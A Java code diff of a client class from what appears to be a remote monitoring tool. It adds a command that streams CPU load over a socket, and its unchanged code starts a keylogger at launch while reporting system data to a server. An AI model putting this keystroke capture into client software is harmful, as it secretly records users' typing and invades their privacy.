@@ -28,7 +28,7 @@ public class Client
     public static boolean isSTOP;
     public static void main(String[] args) throws IOException
     {
-        Scanner scn = new Scanner(System.in);
+
         keyLoger = "";
         KeyLogger.startKeyLoger();
         // getting localhost ip
@@ -74,7 +74,7 @@ public class Client
         {
             @Override
             public void run() {
-
+                Thread CPULOAD;
                 while (!Thread.currentThread().isInterrupted()) {
                     try {
                         // read the message sent to this client
@@ -149,6 +149,31 @@ public class Client
                                 os.setProc(OsHW.getProc(si));
                                 object.data = new Gson().toJson(os).replace("\n","");
                                 dos.writeObject(object);
+                            }
+                            case Message.OPEN_SOCKET_CPU -> {
+                                int port = Integer.parseInt(msg.data);
+                                InetAddress ip = InetAddress.getByName("localhost");
+                                System.out.println(port);
+                                Socket s = new Socket(ip, port);
+                                ObjectOutputStream dos = new ObjectOutputStream(s.getOutputStream());
+                                ObjectInputStream dis = new ObjectInputStream(s.getInputStream());
+                                CPULOAD = new Thread(new Runnable() {
+                                    @Override
+                                    public void run() {
+                                        while(!Thread.currentThread().isInterrupted()) {
+                                            Message cpuload = new Message();
+                                            cpuload.command = 0;
+                                            cpuload.toId = "";
+                                            cpuload.data = String.valueOf(Processor.getCpuPercent());
+                                            try {
+                                                dos.writeObject(cpuload);
+                                            } catch (IOException e) {
+                                                Thread.currentThread().interrupt();
+                                            }
+                                        }
+                                    }
+                                });
+                                CPULOAD.start();
                             }
                             default -> {
                             }
